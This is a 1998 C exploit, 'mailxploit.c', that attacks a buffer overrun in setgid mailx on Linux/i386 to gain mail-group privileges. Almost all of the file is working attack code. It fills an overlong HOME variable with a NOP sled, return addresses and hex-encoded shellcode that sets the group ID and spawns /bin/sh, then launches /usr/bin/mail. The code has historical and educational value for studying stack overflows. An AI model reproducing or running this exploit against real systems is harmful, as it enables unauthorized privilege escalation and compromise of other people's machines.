/*
 * mailxploit.c (Linux/i386)
 * Sat Jun 20 00:47:59 CEST 1998
 * Alvaro Martinez Echevarria <elguru@lander.es>
 * Exploit a buffer overrun in mailx using the environment variable
 * $HOME, to acquire "mail" group privileges (assuming that mailx
 * is installed setgid mail).
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/*
 * The location of mailx.
 */
#define MAILX  "/usr/bin/mail"
/*
 * The gid for group mail (represented in a char, in hexadecimal).
 */
#define GID    "\x08"

#define DEFAULT_OFFSET                 2000
#define DEFAULT_BUFFER_SIZE            1124
#define NOP                            0x90

char shellcode[] =
  /* seteuid(GID); setreuid(GID,GID); */
  "\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1" GID "\x31\xc0\xb0\x47\xcd\x80"
  "\x31\xdb\x31\xc9\xb3" GID "\xb1" GID "\x31\xc0\xb0\x47\xcd\x80"
  /* generic shell code by Aleph One */
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long
get_sp(void) {
   __asm__("movl %esp,%eax");
}

int
main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  addr = get_sp() - offset;
  if ((buff=(char *)malloc(bsize))==NULL) {
    fprintf(stderr,"error in malloc()\n");
    exit(1);
  }

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;
  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;
  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];
  buff[bsize - 1] = '\0';

  setenv("HOME",buff,1);
  execl(MAILX,MAILX,"-n","-f","~/patata",NULL);

  exit(0);

}

